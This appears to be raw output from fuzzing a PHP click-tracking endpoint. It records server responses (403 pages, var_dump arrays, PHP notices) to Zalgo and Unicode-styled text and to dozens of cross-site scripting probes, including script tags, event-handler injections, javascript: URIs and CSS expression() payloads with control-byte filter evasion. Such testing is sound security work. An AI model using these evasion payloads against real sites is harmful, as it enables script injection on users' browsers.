+<p>You don't have permission to access /Ì¡ÍÌÍIÌÌÌ¦ÍnÍÍÍvÌ®Ì«okÌ²Ì«ÌÍiÌÍÌ­Ì¹Ì ÌnÌ¡Ì»Ì®Ì£ÌºgÌ²ÍÍÌ­ÍÌ¬Í Ì°tÍÌ¦hÌÌ²eÌ¢Ì¤ ÍÌ¬Ì²ÍfÌ´ÌÍÌ£Ã¨Íáº¹Ì¥Ì©lÍÍÍiÍÍÌ¦Í nÍÍÌÍÌ³Ì®gÍ Ì¨oÍÌªÍ¡fÌÌ£Ì¬ ÌÌÍÌÍÌ®cÒÍÌ«ÍÍÍÍÍhÌµÌ¤Ì£ÍÍÃ¡ÌÌ¼ÍÍoÌ¼Ì£Ì¥sÌ±ÍÌºÌÌ¦Ì»Í¢.ÌÌÌÌ Ì«Ì°
+on this server.</p>
+</body></html>
+=============================<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>403 Forbidden</title>
+</head><body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access /ÌÌºÍÌ¹Ì¯Íá¹®Ì¤ÍÌ¥ÍÍhÌ²ÌeÍÍÌ¼ÌÌÌ¼Ì£Í ÍÌÌ±Ì ÍÍÍNÍÍ eÌÌ±zÌÌÌÌºÍpÌ¤ÌºÌ¹ÍÌ¯ÍeÌ Ì»Ì ÍrÌ¨Ì¤ÍÌºÌÍÌÌdÌ ÌÌ­Ì¬ÌÍiÌ¦ÍÌ©ÍÍÌ¤aÌ ÌÌ¬ÍÌnÍÍ Ì»ÌÌ°ÍÍhÌµÍiÌ³ÌvÌ¢Íá¸ÍÍ-ÒÌ­Ì©Ì¼ÍmÌ¤Ì­Ì«iÍÍÌÌ¦nÌÍá¸Ì Ì¯Ì²ÍÍÇ«ÌÌ¯Ì°Ì²ÍÌ»Ìf ÌªÌ°Ì°ÌÌÌ­ÌÍcÌ¦ÍÌ²ÌÍÌ©Ìá¸¥ÍaÌ®ÍÌÌÍÆ¡Ì©Ì¹ÍsÌ¤.ÌÌ ÒZÌ¡ÌÌÍÌ°Ì£ÍÌaÍÌ°ÍÌ¬Í¡lÌ²Ì«Ì³ÍÌ©gÌ¡ÌÌ¼Ì±ÍÌÌ¬ÍoÌÍ.Ì
+on this server.</p>
+</body></html>
+=============================<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>403 Forbidden</title>
+</head><body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access /Ì¦HÌ¬Ì¤ÌÌ¤ÍeÍ ÌÌ¥ÌÌ»ÍÌÌwÌhÌÌ¯ÍoÌÍÌÍÌ±Ì® ÒÌºÌÌÌÍWÌ·Ì¼Ì­aÌºÌªÍÄ¯ÍÍÌ­ÍÌ¯ÌtÌ¶Ì¼Ì®sÌÍÍÌ Ì Ì«Ì BÌ»ÍÍÍÌ³ÍeÌµhÌµÌ¬ÍÌ«ÍiÌ¹ÍÌ³Ì³Ì®ÍÌ«ÌnÍdÌ´ÌªÌÌ Ì°ÍÌ©ÍÍÌ²ÍÍTÍÌ¼ÍÌªÍ¢hÍÍÌ®Ì»eÌ¬ÌÌÍ Ì¤Ì¹ÌWÍÌÌÍÍÍÍaÍÍÍÌ¹Ì¼Ì£lÌ´ÍÌ°Ì¤ÌÍá¸½Ì«.Í
+on this server.</p>
+</body></html>
+=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(147) "Z%CC%AE%CC%9E%CC%A0%CD%99%CD%94%CD%85%E1%B8%80%CC%97%CC%9E%CD%88%CC%BB%CC%97%E1%B8%B6%CD%99%CD%8E%CC%AF%CC%B9%CC%9E%CD%93G%CC%BBO%CC%AD%CC%97%CC%AE"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(482) "%CB%99%C9%90nb%E1%B4%89l%C9%90%20%C9%90u%C6%83%C9%90%C9%AF%20%C7%9D%C9%B9olop%20%CA%87%C7%9D%20%C7%9D%C9%B9oq%C9%90l%20%CA%87n%20%CA%87unp%E1%B4%89p%E1%B4%89%C9%94u%E1%B4%89%20%C9%B9od%C9%AF%C7%9D%CA%87%20po%C9%AFsn%E1%B4%89%C7%9D%20op%20p%C7%9Ds%20'%CA%87%E1%B4%89l%C7%9D%20%C6%83u%E1%B4%89%C9%94s%E1%B4%89d%E1%B4%89p%C9%90%20%C9%B9n%CA%87%C7%9D%CA%87%C9%94%C7%9Dsuo%C9%94%20'%CA%87%C7%9D%C9%AF%C9%90%20%CA%87%E1%B4%89s%20%C9%B9olop%20%C9%AFnsd%E1%B4%89%20%C9%AF%C7%9D%C9%B9o%CB%A5"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(16) "00%CB%99%C6%96$-"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(339) "%EF%BC%B4%EF%BD%88%EF%BD%85%20%EF%BD%91%EF%BD%95%EF%BD%89%EF%BD%83%EF%BD%8B%20%EF%BD%82%EF%BD%92%EF%BD%8F%EF%BD%97%EF%BD%8E%20%EF%BD%86%EF%BD%8F%EF%BD%98%20%EF%BD%8A%EF%BD%95%EF%BD%8D%EF%BD%90%EF%BD%93%20%EF%BD%8F%EF%BD%96%EF%BD%85%EF%BD%92%20%EF%BD%94%EF%BD%88%EF%BD%85%20%EF%BD%8C%EF%BD%81%EF%BD%9A%EF%BD%99%20%EF%BD%84%EF%BD%8F%EF%BD%87"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(444) "%F0%9D%90%93%F0%9D%90%A1%F0%9D%90%9E%20%F0%9D%90%AA%F0%9D%90%AE%F0%9D%90%A2%F0%9D%90%9C%F0%9D%90%A4%20%F0%9D%90%9B%F0%9D%90%AB%F0%9D%90%A8%F0%9D%90%B0%F0%9D%90%A7%20%F0%9D%90%9F%F0%9D%90%A8%F0%9D%90%B1%20%F0%9D%90%A3%F0%9D%90%AE%F0%9D%90%A6%F0%9D%90%A9%F0%9D%90%AC%20%F0%9D%90%A8%F0%9D%90%AF%F0%9D%90%9E%F0%9D%90%AB%20%F0%9D%90%AD%F0%9D%90%A1%F0%9D%90%9E%20%F0%9D%90%A5%F0%9D%90%9A%F0%9D%90%B3%F0%9D%90%B2%20%F0%9D%90%9D%F0%9D%90%A8%F0%9D%90%A0"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(444) "%F0%9D%95%BF%F0%9D%96%8D%F0%9D%96%8A%20%F0%9D%96%96%F0%9D%96%9A%F0%9D%96%8E%F0%9D%96%88%F0%9D%96%90%20%F0%9D%96%87%F0%9D%96%97%F0%9D%96%94%F0%9D%96%9C%F0%9D%96%93%20%F0%9D%96%8B%F0%9D%96%94%F0%9D%96%9D%20%F0%9D%96%8F%F0%9D%96%9A%F0%9D%96%92%F0%9D%96%95%F0%9D%96%98%20%F0%9D%96%94%F0%9D%96%9B%F0%9D%96%8A%F0%9D%96%97%20%F0%9D%96%99%F0%9D%96%8D%F0%9D%96%8A%20%F0%9D%96%91%F0%9D%96%86%F0%9D%96%9F%F0%9D%96%9E%20%F0%9D%96%89%F0%9D%96%94%F0%9D%96%8C"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(444) "%F0%9D%91%BB%F0%9D%92%89%F0%9D%92%86%20%F0%9D%92%92%F0%9D%92%96%F0%9D%92%8A%F0%9D%92%84%F0%9D%92%8C%20%F0%9D%92%83%F0%9D%92%93%F0%9D%92%90%F0%9D%92%98%F0%9D%92%8F%20%F0%9D%92%87%F0%9D%92%90%F0%9D%92%99%20%F0%9D%92%8B%F0%9D%92%96%F0%9D%92%8E%F0%9D%92%91%F0%9D%92%94%20%F0%9D%92%90%F0%9D%92%97%F0%9D%92%86%F0%9D%92%93%20%F0%9D%92%95%F0%9D%92%89%F0%9D%92%86%20%F0%9D%92%8D%F0%9D%92%82%F0%9D%92%9B%F0%9D%92%9A%20%F0%9D%92%85%F0%9D%92%90%F0%9D%92%88"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(444) "%F0%9D%93%A3%F0%9D%93%B1%F0%9D%93%AE%20%F0%9D%93%BA%F0%9D%93%BE%F0%9D%93%B2%F0%9D%93%AC%F0%9D%93%B4%20%F0%9D%93%AB%F0%9D%93%BB%F0%9D%93%B8%F0%9D%94%80%F0%9D%93%B7%20%F0%9D%93%AF%F0%9D%93%B8%F0%9D%94%81%20%F0%9D%93%B3%F0%9D%93%BE%F0%9D%93%B6%F0%9D%93%B9%F0%9D%93%BC%20%F0%9D%93%B8%F0%9D%93%BF%F0%9D%93%AE%F0%9D%93%BB%20%F0%9D%93%BD%F0%9D%93%B1%F0%9D%93%AE%20%F0%9D%93%B5%F0%9D%93%AA%F0%9D%94%83%F0%9D%94%82%20%F0%9D%93%AD%F0%9D%93%B8%F0%9D%93%B0"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(444) "%F0%9D%95%8B%F0%9D%95%99%F0%9D%95%96%20%F0%9D%95%A2%F0%9D%95%A6%F0%9D%95%9A%F0%9D%95%94%F0%9D%95%9C%20%F0%9D%95%93%F0%9D%95%A3%F0%9D%95%A0%F0%9D%95%A8%F0%9D%95%9F%20%F0%9D%95%97%F0%9D%95%A0%F0%9D%95%A9%20%F0%9D%95%9B%F0%9D%95%A6%F0%9D%95%9E%F0%9D%95%A1%F0%9D%95%A4%20%F0%9D%95%A0%F0%9D%95%A7%F0%9D%95%96%F0%9D%95%A3%20%F0%9D%95%A5%F0%9D%95%99%F0%9D%95%96%20%F0%9D%95%9D%F0%9D%95%92%F0%9D%95%AB%F0%9D%95%AA%20%F0%9D%95%95%F0%9D%95%A0%F0%9D%95%98"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(444) "%F0%9D%9A%83%F0%9D%9A%91%F0%9D%9A%8E%20%F0%9D%9A%9A%F0%9D%9A%9E%F0%9D%9A%92%F0%9D%9A%8C%F0%9D%9A%94%20%F0%9D%9A%8B%F0%9D%9A%9B%F0%9D%9A%98%F0%9D%9A%A0%F0%9D%9A%97%20%F0%9D%9A%8F%F0%9D%9A%98%F0%9D%9A%A1%20%F0%9D%9A%93%F0%9D%9A%9E%F0%9D%9A%96%F0%9D%9A%99%F0%9D%9A%9C%20%F0%9D%9A%98%F0%9D%9A%9F%F0%9D%9A%8E%F0%9D%9A%9B%20%F0%9D%9A%9D%F0%9D%9A%91%F0%9D%9A%8E%20%F0%9D%9A%95%F0%9D%9A%8A%F0%9D%9A%A3%F0%9D%9A%A2%20%F0%9D%9A%8D%F0%9D%9A%98%F0%9D%9A%90"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(339) "%E2%92%AF%E2%92%A3%E2%92%A0%20%E2%92%AC%E2%92%B0%E2%92%A4%E2%92%9E%E2%92%A6%20%E2%92%9D%E2%92%AD%E2%92%AA%E2%92%B2%E2%92%A9%20%E2%92%A1%E2%92%AA%E2%92%B3%20%E2%92%A5%E2%92%B0%E2%92%A8%E2%92%AB%E2%92%AE%20%E2%92%AA%E2%92%B1%E2%92%A0%E2%92%AD%20%E2%92%AF%E2%92%A3%E2%92%A0%20%E2%92%A7%E2%92%9C%E2%92%B5%E2%92%B4%20%E2%92%9F%E2%92%AA%E2%92%A2"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(25) "%3Cscript%3Ealert(123)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(21) "&lt;script&gt;alert(&"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(38) "%3Cimg%20src=x%20onerror=alert(123)%20"
+  [2]=>
+  string(3) "%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(44) "%3Csvg%3E%3Cscript%3E123%3C1%3Ealert(123)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(31) "%22%3E%3Cscript%3Ealert(123)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(29) "'%3E%3Cscript%3Ealert(123)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(28) "%3E%3Cscript%3Ealert(123)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(4) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(3) "%3C"
+  [2]=>
+  string(34) "script%3E%3Cscript%3Ealert(123)%3C"
+  [3]=>
+  string(9) "script%3E"
+}
+No record found=============================array(4) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(6) "%3C%20"
+  [2]=>
+  string(49) "%20script%20%3E%3C%20script%20%3Ealert(123)%3C%20"
+  [3]=>
+  string(15) "%20script%20%3E"
+}
+No record found=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(44) "%20onfocus=JaVaSCript:alert(123)%20autofocus"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(47) "%22%20onfocus=JaVaSCript:alert(123)%20autofocus"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(45) "'%20onfocus=JaVaSCript:alert(123)%20autofocus"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(43) "%EF%BC%9Cscript%EF%BC%9Ealert(123)%EF%BC%9C"
+  [2]=>
+  string(15) "script%EF%BC%9E"
+}
+No record found=============================array(4) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(37) "%3Csc%3Cscript%3Eript%3Ealert(123)%3C"
+  [2]=>
+  string(5) "sc%3C"
+  [3]=>
+  string(16) "script%3Eript%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(30) "--%3E%3Cscript%3Ealert(123)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(20) "%22;alert(123);t=%22"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(16) "';alert(123);t='"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(21) "JavaSCript:alert(123)"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(12) ";alert(123);"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(26) "src=JaVaSCript:prompt(132)"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(32) "%22%3E%3Cscript%3Ealert(123);%3C"
+  [2]=>
+  string(14) "script%20x=%22"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(30) "'%3E%3Cscript%3Ealert(123);%3C"
+  [2]=>
+  string(12) "script%20x='"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(29) "%3E%3Cscript%3Ealert(123);%3C"
+  [2]=>
+  string(11) "script%20x="
+}
+No record found=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(50) "%22%20autofocus%20onkeyup=%22javascript:alert(123)"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(46) "'%20autofocus%20onkeyup='javascript:alert(123)"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(4) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(27) "%3Cscript%5Cx20type=%22text"
+  [2]=>
+  string(39) "javascript%22%3Ejavascript:alert(1);%3C"
+  [3]=>
+  string(9) "script%3E"
+}
+No record found=============================array(4) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(27) "%3Cscript%5Cx3Etype=%22text"
+  [2]=>
+  string(39) "javascript%22%3Ejavascript:alert(1);%3C"
+  [3]=>
+  string(9) "script%3E"
+}
+No record found=============================array(4) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(27) "%3Cscript%5Cx0Dtype=%22text"
+  [2]=>
+  string(39) "javascript%22%3Ejavascript:alert(1);%3C"
+  [3]=>
+  string(9) "script%3E"
+}
+No record found=============================array(4) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(27) "%3Cscript%5Cx09type=%22text"
+  [2]=>
+  string(39) "javascript%22%3Ejavascript:alert(1);%3C"
+  [3]=>
+  string(9) "script%3E"
+}
+No record found=============================array(4) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(27) "%3Cscript%5Cx0Ctype=%22text"
+  [2]=>
+  string(39) "javascript%22%3Ejavascript:alert(1);%3C"
+  [3]=>
+  string(9) "script%3E"
+}
+No record found=============================array(4) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(27) "%3Cscript%5Cx2Ftype=%22text"
+  [2]=>
+  string(39) "javascript%22%3Ejavascript:alert(1);%3C"
+  [3]=>
+  string(9) "script%3E"
+}
+No record found=============================array(4) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(27) "%3Cscript%5Cx0Atype=%22text"
+  [2]=>
+  string(39) "javascript%22%3Ejavascript:alert(1);%3C"
+  [3]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(50) "'%60%22%3E%3C%5Cx3Cscript%3Ejavascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(50) "'%60%22%3E%3C%5Cx00script%3Ejavascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(67) "ABC%3Cdiv%20style=%22x%5Cx3Aexpression(javascript:alert(1)%22%3EDEF"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(68) "ABC%3Cdiv%20style=%22x:expression%5Cx5C(javascript:alert(1)%22%3EDEF"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(68) "ABC%3Cdiv%20style=%22x:expression%5Cx00(javascript:alert(1)%22%3EDEF"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(68) "ABC%3Cdiv%20style=%22x:exp%5Cx00ression(javascript:alert(1)%22%3EDEF"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(68) "ABC%3Cdiv%20style=%22x:exp%5Cx5Cression(javascript:alert(1)%22%3EDEF"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(68) "ABC%3Cdiv%20style=%22x:%5Cx0Aexpression(javascript:alert(1)%22%3EDEF"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(68) "ABC%3Cdiv%20style=%22x:%5Cx09expression(javascript:alert(1)%22%3EDEF"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(80) "ABC%3Cdiv%20style=%22x:%5CxE3%5Cx80%5Cx80expression(javascript:alert(1)%22%3EDEF"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(80) "ABC%3Cdiv%20style=%22x:%5CxE2%5Cx80%5Cx84expression(javascript:alert(1)%22%3EDEF"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(74) "ABC%3Cdiv%20style=%22x:%5CxC2%5CxA0expression(javascript:alert(1)%22%3EDEF"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(80) "ABC%3Cdiv%20style=%22x:%5CxE2%5Cx80%5Cx80expression(javascript:alert(1)%22%3EDEF"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(80) "ABC%3Cdiv%20style=%22x:%5CxE2%5Cx80%5Cx8Aexpression(javascript:alert(1)%22%3EDEF"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(68) "ABC%3Cdiv%20style=%22x:%5Cx0Dexpression(javascript:alert(1)%22%3EDEF"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(68) "ABC%3Cdiv%20style=%22x:%5Cx0Cexpression(javascript:alert(1)%22%3EDEF"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(80) "ABC%3Cdiv%20style=%22x:%5CxE2%5Cx80%5Cx87expression(javascript:alert(1)%22%3EDEF"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(80) "ABC%3Cdiv%20style=%22x:%5CxEF%5CxBB%5CxBFexpression(javascript:alert(1)%22%3EDEF"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(68) "ABC%3Cdiv%20style=%22x:%5Cx20expression(javascript:alert(1)%22%3EDEF"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(80) "ABC%3Cdiv%20style=%22x:%5CxE2%5Cx80%5Cx88expression(javascript:alert(1)%22%3EDEF"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(68) "ABC%3Cdiv%20style=%22x:%5Cx00expression(javascript:alert(1)%22%3EDEF"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(80) "ABC%3Cdiv%20style=%22x:%5CxE2%5Cx80%5Cx8Bexpression(javascript:alert(1)%22%3EDEF"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(80) "ABC%3Cdiv%20style=%22x:%5CxE2%5Cx80%5Cx86expression(javascript:alert(1)%22%3EDEF"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(80) "ABC%3Cdiv%20style=%22x:%5CxE2%5Cx80%5Cx85expression(javascript:alert(1)%22%3EDEF"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(80) "ABC%3Cdiv%20style=%22x:%5CxE2%5Cx80%5Cx82expression(javascript:alert(1)%22%3EDEF"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(68) "ABC%3Cdiv%20style=%22x:%5Cx0Bexpression(javascript:alert(1)%22%3EDEF"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(80) "ABC%3Cdiv%20style=%22x:%5CxE2%5Cx80%5Cx81expression(javascript:alert(1)%22%3EDEF"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(80) "ABC%3Cdiv%20style=%22x:%5CxE2%5Cx80%5Cx83expression(javascript:alert(1)%22%3EDEF"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(80) "ABC%3Cdiv%20style=%22x:%5CxE2%5Cx80%5Cx89expression(javascript:alert(1)%22%3EDEF"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22%5Cx0Bjavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22%5Cx0Fjavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
